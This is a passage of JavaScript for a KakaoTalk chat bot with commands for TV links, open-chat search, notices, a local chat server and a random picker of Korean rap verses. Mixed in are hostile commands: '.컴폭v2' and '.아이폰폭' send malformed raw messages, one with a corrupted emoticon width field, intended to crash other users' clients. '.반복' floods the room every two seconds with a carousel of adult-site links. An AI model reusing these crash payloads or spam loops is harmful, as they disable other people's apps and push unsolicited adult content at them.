          L: "https://search3.kakaocdn.net/argon/600x0_65_wr/CzHtKJ3bE3m",
          Q: "전국 오늘 날씨",
        });
      }
      if (Text.indexOf(".tv") == 0) {
        let ur = Text.substr(4);
        chat.Channel.setTvLiveMeta({
          url: ur,
          live: "on",
        });
      }
      if (Text.indexOf(".kakaotv") == 0) {
        let wh = encodeURI(Text.substr(9));
        chat.replyText("https://tv.kakao.com/search?q=" + wh);
      }
      if (Text == ".offtv") {
        chat.Channel.setTvLiveMeta({
          url: "",
          live: "off",
        });
      }
      if (chat.Text.startsWith(".개발자유튭")) {
        client.chatManager.sendRaw(chat.channel, 24, "1", {
          os: [
            {
              t: 1,
              st: 1,
              u: {
                id: 351201743,
              },
              fc: false,
            },
            {
              t: 1,
              ct: 1,
              jct: '[{"type":"text","text":"모바일 전용입니다\n 클릭해주세요"}]',
            },
            {
              t: 2,
              st: 1,
              url: "https://youtube.com/channel/UCMVs1EOlkOy6aj9nRTos30g",
            },
          ],
        });
      }
      if (chat.Text == ".컴폭v2") {
        client.chatManager.sendRaw(chat.channel, 3, "3");
      }
      if (chat.Text.startsWith(".컴터챗v2 ")) {
        var a = chat.Text.substr(7).trim();
        client.chatManager.sendRaw(chat.channel, 14, "1", {
          os: [
            {
              t: 2,
              st: 1,
              u: {
                id: 351201743,
              },
              fc: false,
            },
            {
              t: 1,
              ct: a,
              jct: '[{"type":"text","text":"' + a + '"}]',
            },
            {
              t: 2,
              st: 1,
              url: "",
            },
          ],
        });
      }
      if (chat.Text.startsWith(".아이폰폭")) {
        client.chatManager.sendRaw(chat.channel, 25, "GOOD BYE", {
          name: "(이모티콘)",
          path: "4412207.emot_011.webp",
          type: "image/webp",
          width: "-1\n}",
          height: 100,
          xconVersion: 1,
          s: 0,
          alt: "카카오 이모티콘",
        });
      }
      if (Text.indexOf(".검색") == 0) {
        var b = Text.split(" ");
        var a = `https://open.kakao.com/c/search/unified?q=${encodeURI(
          b[1]
        )}&s=l&p=1&c=${encodeURI(b[2])}&expectLock=n`;
        request(a, function (err, res, html) {
          try {
            var $ = cheerio.load(html);
            var openLinkResult = JSON.parse(html);
            if (openLinkResult.count === 0)
              chat.replyText("아무런 방도 검색되지 않았어요!");
            chat.replyText(
              openLinkResult.items
                .map((openLink) =>
                  [
                    "오픈채팅방 이름: " + openLink.ln,
                    "오픈채팅방 링크: " + openLink.lu,
                    "오픈채팅방 방장: " + openLink.nn,
                    "오픈채팅방 설명: " + openLink.desc,
                  ].join("\n")
                )
                .join("\n\n")
            );
          } catch (err) {
            chat.replyText(String(err));
          }
        });
      }
      if (Text == ".채팅서버") {
        try {
          app.get("/", function (req, res) {
            //2
            res.sendFile(__dirname + "/client.html");
          });

          var count = 1;
          io.on("connection", function (socket) {
            //3
            console.log("user connected: ", socket.id); //3-1
            var name = "user" + count++; //3-1
            io.to(socket.id).emit("change name", name); //3-1

            socket.on("disconnect", function () {
              //3-2
              console.log("user disconnected: ", socket.id);
            });

            socket.on("send message", function (name, text) {
              //3-3
              var msg = name + " : " + text;
              console.log(msg);
              io.emit("receive message", msg);
            });
          });
          http.listen(3000, function () {
            //4
            chat.replyText("server on!");
            chat.replyText("server link: http://192.168.219.107:3000/");
          });
        } catch {
          chat.replyText("server is already on!");
        }
      }
      if (Text.startsWith(".공지")) {
        var kaa = Text.substring(4);
        chat.Channel.setNoticeMeta(kaa);
      }
      if (Text == ".반복") {
        let a = 0;
        spamInterval = setInterval(() => {
          chat.replyText(a.toString());
          client.chatManager.sendRaw(chat.channel, a, "성인랭킹", {
            P: {
              ME: "카카오톡 봇",
              LOCK: false,
              AD: false,
              DID: "/bot/5fb551c2d9431d64aa843571/intent/5fb6a0bd2cb6e55d5b67dd06",
              VW: "2.6.1",
              FW: false,
              TP: "Carousel",
              VM: "2.3.5",
              SID: "plusfriend_bot",
              VI: "6.4.5",
              VA: "6.4.5",
              A: {
                version: 1,
                code: "0CrDcJtxWTPrAG8b2S8dp7PhzUMcGrF1MglJiXMQzTE=",
                createdAt: 1614678345558,
              },
            },
            C: {
              CTP: "Feed",
              CIL: [
                {
                  BUT: 1,
                  TI: { TD: { T: "11위", D: "spankbang.com" }, FT: false },
                  THC: 1,
                  BUL: [
                    {
                      L: {
                        LPC: "https://spankbang.com",
                        LMO: "https://spankbang.com",
                      },
                      BU: {
                        T: "들어가기",
                      },
                    },
                  ],
                  L: {},
                  THL: [
                    {
                      TH: {
                        THU: "http://k.kakaocdn.net/dn/bSFzA7/btqNVRIrkyY/26ZX1Dk3VWQWORKPkbiiTK/2x1.jpg",
                        W: 800,
                        H: 400,
                      },
                    },
                  ],
                },
                {
                  BUT: 1,
                  TI: { TD: { T: "12위", D: "dmm.co.jp" }, FT: false },
                  THC: 1,
                  BUL: [
                    {
                      L: { LPC: "https://dmm.co.jp", LMO: "https://dmm.co.jp" },
                      BU: { T: "들어가기" },
                    },
                  ],
                  L: {},
                  THL: [
                    {
                      TH: {
                        THU: "http://k.kakaocdn.net/dn/ExBiC/btqNVSAu05x/Y5GjISEgIIGlftzFW6YpK1/2x1.jpg",
                        W: 800,
                        H: 400,
                      },
                    },
                  ],
                },
                {
                  BUT: 1,
                  TI: { TD: { T: "13위", D: "livejasmin.com" }, FT: false },
                  THC: 1,
                  BUL: [
                    {
                      L: {
                        LPC: "https://livejasmin.com",
                        LMO: "https://livejasmin.com",
                      },
                      BU: { T: "들어가기" },
                    },
                  ],
                  L: {},
                  THL: [
                    {
                      TH: {
                        THU: "http://k.kakaocdn.net/dn/er3wb7/btqNWfWyBZJ/nc5dqdElKJysxF9LQlGGxK/2x1.jpg",
                        W: 800,
                        H: 400,
                      },
                    },
                  ],
                },
                {
                  BUT: 1,
                  TI: { TD: { T: "14위", D: "xhamsterlive.com" }, FT: false },
                  THC: 1,
                  BUL: [
                    {
                      L: {
                        LPC: "https://xhamsterlive.com",
                        LMO: "https://xhamsterlive.com",
                      },
                      BU: { T: "들어가기" },
                    },
                  ],
                  L: {},
                  THL: [
                    {
                      TH: {
                        THU: "http://k.kakaocdn.net/dn/yI5UK/btqNXeJCIc4/Fbf9MnBFL1NnXcYYiHzbUk/2x1.jpg",
                        W: 800,
                        H: 400,
                      },
                    },
                  ],
                },
                {
                  BUT: 1,
                  TI: { TD: { T: "15위", D: "xvideos3.com" }, FT: false },
                  THC: 1,
                  BUL: [
                    {
                      L: {
                        LPC: "https://xvideos3.com",
                        LMO: "https://xvideos3.com",
                      },
                      BU: { T: "들어가기" },
                    },
                  ],
                  L: {},
                  THL: [
                    {
                      TH: {
                        THU: "http://k.kakaocdn.net/dn/bExDVn/btqNVRO8iiN/oAbUXVY13hkuz2q761ImsK/2x1.jpg",
                        W: 800,
                        H: 400,
                      },
                    },
                  ],
                },
                {
                  BUT: 1,
                  TI: { TD: { T: "16위", D: "xnxx.es" }, FT: false },
                  THC: 1,
                  BUL: [
                    {
                      L: { LPC: "https://xnxx.es", LMO: "https://xnxx.es" },
                      BU: { T: "들어가기" },
                    },
                  ],
                  L: {},
                  THL: [
                    {
                      TH: {
                        THU: "http://k.kakaocdn.net/dn/0vbyx/btqNVCdEjuB/Itdp5cVKwWb2AaVblkISK0/2x1.jpg",
                        W: 800,
                        H: 400,
                      },
                    },
                  ],
                },
                {
                  BUT: 1,
                  TI: { TD: { T: "17위", D: "pornhubpremium.com" }, FT: false },
                  THC: 1,
                  BUL: [
                    {
                      L: {
                        LPC: "https://pornhubpremium.com",
                        LMO: "https://pornhubpremium.com",
                      },
                      BU: { T: "들어가기" },
                    },
                  ],
                  L: {},
                  THL: [
                    {
                      TH: {
                        THU: "http://k.kakaocdn.net/dn/cRlPpG/btqNSAm7rU8/vodqk0QRmgPOfnOwr58ds1/2x1.jpg",
                        W: 800,
                        H: 400,
                      },
                    },
                  ],
                },
                {
                  BUT: 1,
                  TI: { TD: { T: "18위", D: "onlyfans.com" }, FT: false },
                  THC: 1,
                  BUL: [
                    {
                      L: {
                        LPC: "https://onlyfans.com",
                        LMO: "https://onlyfans.com",
                      },
                      BU: { T: "들어가기" },
                    },
                  ],
                  L: {},
                  THL: [
                    {
                      TH: {
                        THU: "http://k.kakaocdn.net/dn/FhCmO/btqNXcLO8tZ/okimbJy1bSeik6G1RrM1wk/2x1.jpg",
                        W: 800,
                        H: 400,
                      },
                    },
                  ],
                },
                {
                  BUT: 1,
                  TI: { TD: { T: "19위", D: "xvideos-cdn.com" }, FT: false },
                  THC: 1,
                  BUL: [
                    {
                      L: {
                        LPC: "https://xvideos-cdn.com",
                        LMO: "https://xvideos-cdn.com",
                      },
                      BU: { T: "들어가기" },
                    },
                  ],
                  L: {},
                  THL: [
                    {
                      TH: {
                        THU: "http://k.kakaocdn.net/dn/X1kbA/btqNSzuVuHu/1gV1rZeWBolqHpjiHJ5p60/2x1.jpg",
                        W: 800,
                        H: 400,
                      },
                    },
                  ],
                },
                {
                  BUT: 1,
                  TI: { TD: { T: "20위", D: "rule34.xxx" }, FT: false },
                  THC: 1,
                  BUL: [
                    {
                      L: {
                        LPC: "https://rule34.xxx",
                        LMO: "https://rule34.xxx",
                      },
                      BU: { T: "들어가기" },
                    },
                  ],
                  L: {},
                  THL: [
                    {
                      TH: {
                        THU: "http://k.kakaocdn.net/dn/bUFfIv/btqNVR2FQrT/QVpsTHyHpLhgJYagG6Za8K/2x1.jpg",
                        W: 800,
                        H: 400,
                      },
                    },
                  ],
                },
              ],
            },
            bot: "b",
            bot_msg_ttl: 1095,
          });

          a++;
        }, 2000);
      }
      function sendKV(chat, name, link) {
        client.chatManager.sendRaw(chat.channel, 23, "Search", {
          L: link,
          Q: name,
          V: "image",
          R: [{ D: name, L: link, I: link, W: 120, H: 68 }],
        });
      }
      if (chat.Text == ".킬링벌스") {
        var value = Math.floor(Math.random() * 92);
        switch (value) {
          case 0:
            sendKV(
              chat,
              "창모 (13:28)",
              "http://mblogthumb3.phinf.naver.net/MjAyMDA3MjZfMjEz/MDAxNTk1NzQ1MDQ3MTgx.b0JvpoQOAuMnXQTyxFbIkOs10t2f9QSs-iIZovVWyu8g.0cUG6HdCyFMG_Ubufr1dOwgjeV49C6M9CyEqA5G0upcg.JPEG.leedahee7/1571362250267.jpeg?type=w580"
            );
            break;
          case 1:
            sendKV(
              chat,
              "저스디스 (13:14)",
              "http://dthumb.phinf.naver.net/?src=%22https%3A%2F%2Fi.ytimg.com%2Fvi%2FiMTblJbmam4%2Fmaxresdefault.jpg%22&type=f560_336"
            );
            break;
          case 2:
            sendKV(
              chat,
              "애쉬아일랜드(12:00)",
              "http://mblogthumb3.phinf.naver.net/MjAyMDA3MjZfMyAg/MDAxNTk1NzQ0MzI3Mzc4.v57pYeMIbwddWVXiBtXdt5kNUAT4V0r0p3xMKL4Fd8Ag.dUO8S8ITUbERz6RemRLkVIjFi7lRRvqaOyvN_7MFmywg.JPEG.leedahee7/maxresdefault_(1).jpg?type=w580"
            );
            break;
          case 3:
            sendKV(
              chat,
              "사이먼도미닉 (14:07)",
              "http://dthumb.phinf.naver.net/?src=%22https%3A%2F%2Fi.ytimg.com%2Fvi%2F6-h-KF3Pnzo%2Fmaxresdefault.jpg%22&type=f560_336"
            );
            break;
          case 4:
            sendKV(
              chat,
              "수퍼비 (17:22)",
              "http://t1.daumcdn.net/cfile/tistory/991649505EE8C7A02B"
            );
            break;
          case 5:
            sendKV(
              chat,
              "MC스나이퍼 (9:02)",
              "http://dthumb.phinf.naver.net/?src=%22https%3A%2F%2Fi.ytimg.com%2Fvi%2FMFPedxj45Ag%2Fmaxresdefault.jpg%22&type=f560_336"
            );
            break;
          case 6:
            sendKV(
              chat,
              "지코 (11:50)",
              "http://mblogthumb2.phinf.naver.net/MjAyMDA3MjZfMjM3/MDAxNTk1NzQ1MTYxMDEy.hPcgvbl76jV2uZ9kHoDGsR6aWho8Fjt-TJLzsgaYXUog.xEGWqadNJK1haYzJ60nDNLvHleXDSPOJu2K_HsCoWdIg.JPEG.leedahee7/maxresdefault.jpg?type=w580"
            );
            break;
          case 7:
            sendKV(
              chat,
              "박재범 (14:02)",
              "http://dthumb.phinf.naver.net/?src=%22https%3A%2F%2Fi.ytimg.com%2Fvi%2FeYwmtI97iyE%2Fmaxresdefault.jpg%22&type=f560_336"
            );
            break;
          case 8:
            sendKV(
              chat,
              "래원 (13:12)",
              "https://dthumb-phinf.pstatic.net/?src=%22https%3A%2F%2Fphinf.pstatic.net%2Ftvcast%2F20201027_63%2Fwb6Yv_1603778227736VQkof_PNG%2F1603778144981.png%3Ftype%3Df880_495_blend%22&type=ff500_300"
            );
            break;
          case 9:
            sendKV(
              chat,
              "비와이 (12:13)",
              "http://dthumb.phinf.naver.net/?src=%22https%3A%2F%2Fi.ytimg.com%2Fvi%2F4tJ7cVpONo4%2Fmaxresdefault.jpg%22&type=f560_336"
            );
            break;
          case 10:
            sendKV(
              chat,
              "릴러말즈.(12:47)",
              "http://dn-m.talk.kakao.com/talkm/oYhXuw3Ta4/OSNQOimZexirpNxCRDxko1/i_eow0ic90ho3m1.jpg"
            );
            break;
          case 11:
            sendKV(
              chat,
              "자이언티 (11:25)",
              "http://dn-m.talk.kakao.com/talkm/oYhTXl4Rrj/BwZsJ7FhEO0blWAwRqzAl1/i_hved1skf0qxg.jpg"
            );
            break;
          case 12:
            sendKV(
              chat,
              "비비 (13:54)",
              "http://dn-m.talk.kakao.com/talkm/oYhXFSTeVO/H3VzluKxZQgY8pc7JJSKhk/i_59oemxk0pfcw.jpg"
            );
            break;
          case 13:
            sendKV(
              chat,
              "김하온 (9:16)",
              "http://dn-m.talk.kakao.com/talkm/oYhTYL2R74/D2YDgrTzXWBfH9FYPPvv8k/i_0tzkis6aje0n1.jpg"
            );
            break;
          case 14:
            sendKV(
              chat,
              "호미들 (15:21)",
              "http://dn-m.talk.kakao.com/talkm/oYhThdQUjf/4LlSi0qewGcWvPIHs4V80k/i_tq35pdd0bk5g1.jpg"
            );
            break;
          case 15:
            sendKV(
              chat,
              "해쉬스완 (9:41)",
              "http://dn-m.talk.kakao.com/talkm/oYhVxALP57/vdpk1IWqkvIU8432hjYKSk/i_ai9r18akbaoy.jpg"
            );
            break;
            case16: sendKV(
              chat,
              "CL (15:46)",
              "http://dn-m.talk.kakao.com/talkm/oYhVnrnztH/ke55gqSEvg1kyBMs3Iyx0K/i_plv7atbefwpg.jpg"
            );
            break;
          case 17:
            sendKV(
              chat,
              "키드밀리 (15:52)",
              "http://dn-m.talk.kakao.com/talkm/oYhYpoT2ZM/KSK5lqAQ0GgVpfGTgqbzxk/i_7kuocb8ekrhn1.jpg"
            );
            break;
          case 18:
            sendKV(
              chat,
              "기리보이 (9:18)",
              "http://dn-m.talk.kakao.com/talkm/oYhR91gGN4/Iiorln0FF52xJO6rfnzs30/i_pre5elgjispu1.jpg"
            );
            break;
          case 19:
            sendKV(
              chat,
              "나플라 (11:50)",
              "http://dn-m.talk.kakao.com/talkm/oYhW46hoJg/5LFb2OBKISHFKTSDf3ene1/i_jxrdfn56e3pa.jpg"
            );
            break;
          case 20:
            sendKV(
              chat,
              "제시 (10:09)",
              "http://dn-m.talk.kakao.com/talkm/oYhWdIZmCM/aKfRTNeVTd9tX2HCqpZbYk/i_w8747619f9jo1.jpg"
            );
            break;
          case 21:
            sendKV(
              chat,
              "송민호 (15:54)",
              "http://dn-m.talk.kakao.com/talkm/oYhVoDPqEX/cAra2fuxKdZPaFwUzGjtwK/i_0jdt70vjvgn71.jpg"
            );
            break;
          case 22:
            sendKV(
              chat,
              "pH-1 (12:51)",
              "http://dn-m.talk.kakao.com/talkm/oYhTgstT3b/VwKsKKKkKRJSkr4aasQMn0/i_2veetylzmtf4.jpg"
            );
            break;
          case 23:
            sendKV(
              chat,
              "노엘 (6:53)",
              "http://dn-m.talk.kakao.com/talkm/oYhV0XbqkW/3Oei0iiXkuDJnu9jAQ3MlK/i_nku5kt0b15181.jpg"
            );
            break;
          case 24:
            sendKV(
              chat,
              "서동현 (14:43)",
              "http://dn-m.talk.kakao.com/talkm/oYhTW1Me9w/rQcY1ppyYJS5NoRQiL0PL0/i_58q4pjdlf3jf1.jpg"
            );
            break;
          case 25:
            sendKV(
              chat,
              "브린, 하선호, 이영지 (12:14)",
              "http://dn-m.talk.kakao.com/talkm/oYhShEZWoR/QK5mwGBgHx6XpQ4FFxk2pk/i_d9zunzfl86mw1.jpg"
            );
            break;
          case 26:
            sendKV(
              chat,
              "크러쉬 (12:53)",
              "http://dn-m.talk.kakao.com/talkm/oYhVpQgxG8/rdDMGtQTYRJOh0mStFv9BK/i_rrbh6nxgslyt1.jpg"
            );
            break;
          case 27:
            sendKV(
              chat,
              "타이거JK (16:21)",
              "http://dn-m.talk.kakao.com/talkm/oYhWQ1f6yM/YBTot3qqg3AXKHUcsmOBv0/i_yijatjyxmhmp.jpg"
            );
            break;
          case 28:
            sendKV(
              chat,
              "넉살 (13:57)",
              "http://dn-m.talk.kakao.com/talkm/oYhWVap51K/qXa9YyAYWKUUtnhAXU8nx1/i_zqxv6dprns021.jpg"
            );
            break;
          case 29:
            sendKV(
              chat,
              "염따 (13:42)",
              "http://dn-m.talk.kakao.com/talkm/oYhYojeaMY/iKL2vKokuSJHJzJqodwnKk/i_d0kytz9scdzn1.jpg"
            );
            break;
          case 30:
            sendKV(
              chat,
              "산이 (13:56)",
              "http://dn-m.talk.kakao.com/talkm/oYhWd3iYCS/uyvvIaqhhXUhj0dWxRwpXK/i_jckcobc8fnot.jpg"
            );
            break;
          case 31:
            sendKV(
              chat,
              "마미손 (13:57)",
              "http://dn-m.talk.kakao.com/talkm/oYhUL6VZFZ/0FSNQkFDWuvm3WcakjNiD0/i_w60kjjio5gah.jpg"
            );
            break;
          case 32:
            sendKV(
              chat,
              "한요한 (10:59)",
              "http://dn-m.talk.kakao.com/talkm/oYhTk9urmk/zTDbZKMLxolC0QAHyjolb1/i_rys7dr31ed821.jpg"
            );
            break;
          case 33:
            sendKV(
              chat,
              "이바다 (8:17)",
              "http://dn-m.talk.kakao.com/talkm/oYhVYkLKop/TtG0Jv1ZbxUmc7EozDARNK/i_05jzotegyt39.jpg"
            );
            break;
          case 34:
            sendKV(
              chat,
              "빈첸 (12:22)",
              "http://dn-m.talk.kakao.com/talkm/oYhVqazjSx/RJ3EXU3xTCwclTsnKbqzk1/i_9xdfarexcyxl.jpg"
            );
            break;
          case 35:
            sendKV(
              chat,
              "루피 (12:11)",
              "http://dn-m.talk.kakao.com/talkm/oYhYr784rS/3XgRPrkLXcou4NxIChsk21/i_99nu439mlthf1.jpg"
            );
            break;
          case 36:
            sendKV(
              chat,
              "허클베리피 (8:18)",
              "http://dn-m.talk.kakao.com/talkm/oYhXNpUeRX/tho7sSsR8OgReKf0CnjRw1/i_wtpkqm97aigo.jpg"
            );
            break;
          case 37:
            sendKV(
              chat,
              "제네더질라 (12:59)",
              "http://dn-m.talk.kakao.com/talkm/oYhZX6XGgF/VNHlOiZ0AAKjA3gkfehQNK/i_3l1m1ho20qjs.jpg"
            );
            break;
          case 38:
            sendKV(
              chat,
              "이센스 (8:04)",
              "http://dn-m.talk.kakao.com/talkm/oYhVnZhGnE/krZnh8Zyse3JTL9jMjxQXk/i_20lv2ku79918.jpg"
            );
            break;
          case 39:
            sendKV(
              chat,
              "릴보이 (15:57)",
              "http://dn-m.talk.kakao.com/talkm/oYhS4lkV1O/RG3PKylwsfKdXkVOUxW4ak/i_jtepcejakzs9.jpg"
            );
            break;
          case 40:
            sendKV(
              chat,
              "스윙스 (14:33)",
              "http://dn-m.talk.kakao.com/talkm/oYhTgF4Lfu/pFenPxyCDwkmMe8ds0XZS0/i_i5frk9x3eqgo1.jpg"
            );
            break;
          case 41:
            sendKV(
              chat,
              "양동근 (16:20)",
              "http://dn-m.talk.kakao.com/talkm/oYhXAYn9OV/ekKmnn6kzLAgaMpJTzFTk1/i_0ugjxniek8tr1.jpg"
            );
            break;
          case 42:
            sendKV(
              chat,
              "매드클라운 (12:27)",
              "http://dn-m.talk.kakao.com/talkm/oYhYkHWQbO/mmhkjAQlhcAAm7na8yGUj1/i_xiunm86p4tf71.jpg"
            );
            break;
          case 43:
            sendKV(
              chat,
              "쿠기 (6:38)",
              "http://dn-m.talk.kakao.com/talkm/oYhUGxPH8I/qzd0lKNKlqtEkD6JVLcsv0/i_qhf4f14sdhga.jpg"
            );
            break;
          case 44:
            sendKV(
              chat,
              "오왼오바도즈 (13:41)",
              "http://dn-m.talk.kakao.com/talkm/oYhZuwW6KM/90SkeWd7iA5TqSqtDVieL1/i_za52ndvbghlk1.jpg"
            );
            break;
          case 45:
            sendKV(
              chat,
              "언에듀케이티드키드 (11:13)",
              "http://dn-m.talk.kakao.com/talkm/oYhTw9UkDK/X9kaYwrkTO5PUXCU7RSLK0/i_8hyotu6riok91.jpg"
            );
            break;
          case 46:
            sendKV(
              chat,
              "아웃사이더 (13:10)",
              "http://dn-m.talk.kakao.com/talkm/oYhXx8rwab/8WjJjttnAHRgCkfBHidq6k/i_h5nvgyikmuye.jpg"
            );
            break;
          case 47:
            sendKV(
              chat,
              "피타입 (16:05)",
              "http://dn-m.talk.kakao.com/talkm/oYhWV9n5HC/TlFKbkvJHjB3FpNUT4UNY0/i_iuxhnehn0k67.jpg"
            );
            break;
          case 48:
            sendKV(
              chat,
              "제이미 (9:36)",
              "http://dn-m.talk.kakao.com/talkm/oYhTs7vIss/Y1ikFwSwmyX1X5skKE6qtK/i_53qxnmvzdpwu1.jpg"
            );
            break;
          case 49:
            sendKV(
              chat,
              "후디 (11:22)",
              "http://dn-m.talk.kakao.com/talkm/oYhYrtxxQi/Si3JWnP71PxrcoMXnxTe4K/i_32twb4wt0p86.jpg"
            );
            break;
          case 50:
            sendKV(
              chat,
              "오담률 (14:16)",
              "http://dn-m.talk.kakao.com/talkm/oYhTpwbdNv/Ru59A9UaJ5uSmycF3Apxy1/i_8ksi4tyfmfbl.jpg"
            );
            break;
          case 51:
            sendKV(
              chat,
              "다이나믹듀오 (14:20)",
              "http://dn-m.talk.kakao.com/talkm/oYhZGqCQIf/Fu5RMRTNcFvMyxreilkUSk/i_memy1kficx3m.jpg"
            );
            break;
          case 52:
            sendKV(
              chat,
              "식케이 (16:05)",
              "http://dn-m.talk.kakao.com/talkm/oYhVknXKkj/g51UHkmAs1kFhL0xCuJjZ1/i_6rx4bwlzgtqr1.jpg"
            );
            break;
          case 53:
            sendKV(
              chat,
              "유라 (14:00)",
              "http://dn-m.talk.kakao.com/talkm/oYhTQN44R7/31dC2Mh2d9Pv44VicVPG3K/i_6jhhykeaqbnt.jpg"
            );
            break;
          case 54:
            sendKV(
              chat,
              "지소울 (10:11)",
              "http://dn-m.talk.kakao.com/talkm/oYhTjW5LIg/0lKHPHFPlH69rncSxWvz3k/i_oa9zzy4mr2x6.jpg"
            );
            break;
          case 55:
            sendKV(
              chat,
              "팔로알토 (11:00)",
              "http://dn-m.talk.kakao.com/talkm/oYhVyGuJMZ/6TnWmLkMf0of7fphD2fOtk/i_v0jyohn4gntl.jpg"
            );
            break;
          case 56:
            sendKV(
              chat,
              "죠지 (7:35)",
              "http://dn-m.talk.kakao.com/talkm/oYhTcp8F08/QEplGBVLzwr67Nhy5yHdkK/i_96f8iu8fn3u8.jpg"
            );
            break;
          case 57:
            sendKV(
              chat,
              "이케이 (12:09)",
              "http://dn-m.talk.kakao.com/talkm/oYhXHpGe5R/IBrmqSpSdZdK7KZpvvCry0/i_mg0wfdw2kdxg.jpg"
            );
            break;
          case 58:
            sendKV(
              chat,
              "소금 (9:59)",
              "http://dn-m.talk.kakao.com/talkm/oYhT1B4h0J/BmBGz5xmc2utYUhNVrW6xk/i_hk49xz7cngjw.jpg"
            );
            break;
          case 59:
            sendKV(
              chat,
              "카더가든 (11:43)",
              "http://dn-m.talk.kakao.com/talkm/oYhZq2oeT9/yBKy2CGE2vVvy9WMmrbUvK/i_xrb1n1t60n6m1.jpg"
            );
            break;
          case 60:
            sendKV(
              chat,
              "05학번이즈백 (10:27)",
              "http://dn-m.talk.kakao.com/talkm/oYhW0CQ9xw/QAXd1QUeEp7cCrdSY57O10/i_1l0m68yvqblj.jpg"
            );
            break;
          case 61:
            sendKV(
              chat,
              "리듬파워 (14:53)",
              "http://dn-m.talk.kakao.com/talkm/oYhV0XeENF/avIGlflIf4oAlpd0aEcm20/i_xygifawu4i911.jpg"
            );
            break;
          case 62:
            sendKV(
              chat,
              "트웰브 (13:15)",
              "http://dn-m.talk.kakao.com/talkm/oYhTcXYA5x/LL07KY6vBoJqlIzFuagMv1/i_c6ghhhnm8npt.jpg"
            );
            break;
          case 63:
            sendKV(
              chat,
              "딥플로우 (11:45)",
              "http://dn-m.talk.kakao.com/talkm/oYhXysJPx7/OTKLfxIAqVxN6dQE1LRiXk/i_2mqcholkzmci.jpg"
            );
            break;
          case 64:
            sendKV(
              chat,
              "펀치넬로 (7:05)",
              "http://dn-m.talk.kakao.com/talkm/oYhTLlHCGu/VpSBXUeCBUisPFwEsPw6fk/i_gsgrz21ylreh1.jpg"
            );
            break;
          case 65:
            sendKV(
              chat,
              "빌스텍스 (15:02)",
              "http://dn-m.talk.kakao.com/talkm/oYhYAYlefB/s4Q6aHk2vQ4kRE44s7NVk0/i_l8mld5hsfu191.jpg"
            );
            break;
          case 66:
            sendKV(
              chat,
              "베이식 (15:27)",
              "http://dn-m.talk.kakao.com/talkm/oYhVs0ByoY/JyeGzqwXcAp2uK1uL4sJo0/i_3n3a4f3s75ij.jpg"
            );
            break;
          case 67:
            sendKV(
              chat,
              "브린 (11:05)",
              "http://dn-m.talk.kakao.com/talkm/oYhWQG1T6e/3nBTdNihxXMRvgP3PGIL61/i_hm077i9mi9yx.jpg"
            );
            break;
          case 68:
            sendKV(
              chat,
              "리진굿즈 (15:41)",
              "http://dn-m.talk.kakao.com/talkm/oYhVvC2cuk/Kc8kjKeooIrfiSDS2OKys1/i_qxuor0tin03l.jpg"
            );
            break;
          case 69:
            sendKV(
              chat,
              "뉴챔프 (14:06)",
              "http://dn-m.talk.kakao.com/talkm/oYhWSLBXFy/1eBKDkXabYwezjqM9N5KeK/i_jnadz9hvu3y61.jpg"
            );
            break;
          case 70:
            sendKV(
              chat,
              "테이크원 (14:59)",
              "http://dn-m.talk.kakao.com/talkm/oYhWgTj50G/ua9wSIBU5F4pUcmbIoYQK0/i_rr7lhj4zhjj61.jpg"
            );
            break;
          case 71:
            sendKV(
              chat,
              "이그니토 (13:41)",
              "http://dn-m.talk.kakao.com/talkm/oYhTyUcLTG/v0ZUcWqhXmMVNM66eQ1gh1/i_l31ghc6l68g21.jpg"
            );
            break;
          case 72:
            sendKV(
              chat,
              "콜드 (13:51)",
              "http://dn-m.talk.kakao.com/talkm/oYhVn537hz/SdKKkelup9JRoHU4c9vUL1/i_bybbqsuqr5cm.jpg"
            );
            break;
          case 73:
            sendKV(
              chat,
              "지조 (10:32)",
              "http://dn-m.talk.kakao.com/talkm/oYhYhdoWvG/5OFo502XhBUDU6u6r7MK3k/i_nq0b18nvt8d71.jpg"
            );
            break;
          case 74:
            sendKV(
              chat,
              "올티 (7:56)",
              "http://dn-m.talk.kakao.com/talkm/oYhZY5TiGs/KYosCbgkkn254Gs9OWQUK1/i_60dmp0swcz0m.jpg"
            );
            break;
          case 75:
            sendKV(
              chat,
              "오디 (6:46)",
              "http://dn-m.talk.kakao.com/talkm/oYhYARzSGB/isTFaVbP1irnptCeh6fw0K/i_4kst9o3l6ygl1.jpg"
            );
            break;
          case 76:
            sendKV(
              chat,
              "스월비 (14:29) ",
              "http://dn-m.talk.kakao.com/talkm/oYhTpprofL/uAKOn5Pq7KTeX8CVL37jy1/i_f3ap4cjq7z461.jpg"
            );
            break;
          case 77:
            sendKV(
              chat,
              "MC메타 (13:39)",
              "http://dn-m.talk.kakao.com/talkm/oYhTY6qoL5/0ujRDN8e4kDHM7MuyYzrtk/i_g1sth7en8rxn.jpg"
            );
            break;
          case 78:
            sendKV(
              chat,
              "던말릭 (15:35)",
              "http://dn-m.talk.kakao.com/talkm/oYhZYrhS0M/yUmEw6YtcQiDK5CTiVyxa1/i_xlla5n5qhmhh1.jpg"
            );
            break;
          case 79:
            sendKV(
              chat,
              "레디 (13:51)",
              "http://dn-m.talk.kakao.com/talkm/oYhZZ4NA3a/09UWH3sRnUrVjsvjkDUfI0/i_vr5ylf1fc79c1.jpg"
            );
            break;
          case 80:
            sendKV(
              chat,
              "블루 (14:02)",
              "http://dn-m.talk.kakao.com/talkm/oYhTv4fEuY/OGnpmwBCvLpbmsTbdOwvK0/i_jsfglw9r1png.jpg"
            );
            break;
          case 81:
            sendKV(
              chat,
              "페노메코 (14:15)",
              "http://dn-m.talk.kakao.com/talkm/oYhYq9gB7y/imNnj6cq9b2yZZd5DsCzL0/i_gbf8cgsr8yxl1.jpg"
            );
            break;
          case 82:
            sendKV(
              chat,
              "브라운티거 (13:49)",
              "http://dn-m.talk.kakao.com/talkm/oYhZUoS7lq/jxk3BO4uLHpyOdIE0Bqd9k/i_lvef8mc1ne7v1.jpg"
            );
            break;
          case 83:
            sendKV(
              chat,
              "오르내림 (13:10)",
              "http://dn-m.talk.kakao.com/talkm/oYhV0iDY9T/0ENYYHRMZ2sJouOZfuOmQk/i_v0eltljrl9zf.jpg"
            );
            break;
          case 84:
            sendKV(
              chat,
              "치타 (12:35)",
              "http://dn-m.talk.kakao.com/talkm/oYhS7CnyUK/byKJmzugjCsnHirg7z5OJk/i_n0fg8060z9i7.jpg"
            );
            break;
          case 85:
            sendKV(
              chat,
              "마이노스 (15:44)",
              "http://dn-m.talk.kakao.com/talkm/oYhTCPQNL9/0OqdI5qMb6WJJ3h4sgK9Ck/i_im6pbgmoujmw.jpg"
            );
            break;
          case 86:
            sendKV(
              chat,
